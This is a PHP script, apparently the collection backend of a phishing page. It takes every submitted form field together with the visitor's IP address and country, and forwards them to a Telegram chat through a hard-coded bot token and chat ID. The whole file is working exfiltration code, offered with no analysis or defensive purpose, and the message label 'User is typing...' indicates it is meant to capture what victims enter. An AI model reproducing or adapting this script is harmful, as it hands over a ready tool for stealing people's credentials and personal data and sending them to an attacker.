<?php
$botToken = "8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s";
$chatId = "-4932499123";

// Get IP and Country
function getUserIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
  return $_SERVER['REMOTE_ADDR'];
}

$ip = getUserIP();
$country = file_get_contents("http://ip-api.com/line/$ip?fields=country");

// Get Typed Data
$typed = "";
foreach ($_POST as $key => $value) {
  $typed .= "$key: $value\n";
}

$message = "✍️ User is typing...\nIP: $ip\nCountry: $country\n\nTyped:\n$typed";

// Send to Telegram
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
?>
